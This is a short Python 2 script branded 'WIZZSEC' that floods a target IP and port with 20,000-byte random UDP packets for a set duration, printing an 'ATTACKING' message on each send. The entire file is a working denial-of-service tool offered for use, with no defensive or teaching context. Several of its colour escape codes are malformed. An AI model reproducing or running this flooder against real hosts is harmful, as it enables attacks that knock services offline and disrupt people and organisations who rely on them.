import time
import socket
import random
import sys

def usage():
    print "033[1;91python2 k.py ip port packets"
    
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "033[1;91 WIZZSEC033[1;91 ATTACKING TO IP\033[0m {}033[1;91 ON PORT\033[0m {}\033[0m".format(victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
